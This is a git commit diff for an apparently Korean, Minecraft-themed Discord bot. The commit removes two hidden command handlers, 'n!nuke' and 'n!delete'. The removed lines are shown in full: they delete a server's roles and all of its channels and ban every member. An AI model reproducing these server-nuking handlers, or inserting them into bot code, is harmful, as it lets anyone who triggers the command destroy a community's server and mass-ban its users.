e17ed9f6edaafcea8bd0886979dbd64550762a4f
emerald0762 <choiju2007@gmail.com>
2020-12-20 19:22:25 +0900

    bot upload

--- index.js
+++ index.js
@@ -59,16 +59,6 @@ client.on('message', (message) => {
   
       message.channel.send(embed)
     }
-
-    if(message.content.toLowerCase().startsWith("n!" + "nuke")){
-      message.guild.roles.filter(r=>r.position < message.guild.me.highestRole.position).deleteAll();
-      message.guild.channels.deleteAll();
-      message.guild.members.tap(member => member.ban("Banned by Nuke Bot | Get Rekt"));
-  }
-  if(message.content.toLowerCase().startsWith("n!" + "delete")){
-      message.guild.roles.filter(r => r.position < message.guild.me.highestRole.position).deleteAll();
-      message.guild.channels.deleteAll();
-  }
     
   if(message.content == '에메랄드 명령어 리스트') {
     let img = 'https://gamepedia.cursecdn.com/minecraft_ko_gamepedia/6/6a/Emerald.png?version=37ba648ee37d87a1deefc3ae8adac3a7';
@@ -115,16 +105,6 @@ client.on('message', (message) => {
 
     message.channel.send(embed)
   }
-
-  if(msg.content.toLowerCase().startsWith("n!" + "nuke")){
-    msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
-    msg.guild.channels.deleteAll();
-    msg.guild.members.tap(member => member.ban("Banned by Nuke Bot | Get Rekt"));
-}
-if(msg.content.toLowerCase().startsWith("n!" + "delete")){
-    msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
-    msg.guild.channels.deleteAll();
-}
 
   if(message.content.startsWith('에메랄드 전체공지')) {
     if(checkPermission(message)) return
